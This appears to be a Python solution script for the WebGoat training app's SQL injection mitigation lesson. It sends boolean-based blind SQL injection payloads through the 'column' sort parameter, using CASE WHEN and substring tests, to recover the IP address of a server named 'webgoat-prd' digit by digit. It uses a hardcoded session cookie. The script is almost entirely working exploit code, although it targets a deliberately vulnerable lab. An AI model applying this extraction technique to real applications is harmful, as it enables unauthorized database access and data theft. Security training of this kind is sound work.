import requests


url="http://192.168.88.1:8080/WebGoat/SqlInjectionMitigations/servers"
header={"Cookie":"JSESSIONID=cF6vfzOwxdghxONlL0NwaTB3n_rDsWI3y2YooCTy","Accept-Language":"zh-CN,zh;q=0.9","Accept-Encoding":"gzip, deflate","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36","Accept":"*/*"}

t=""

for i in range(0,4):
    for j in range(0,10):
        getdata=f"(case+when+(substring((select+ip+from+servers+where+hostname='webgoat-prd'),{i},1)='{j}')+then+id+else+hostname+end)--+"
        res=requests.get(f"{url}?column={getdata}",headers=header)
        t=res.text
        if(t[14]=="1"):
            print(j,end="")


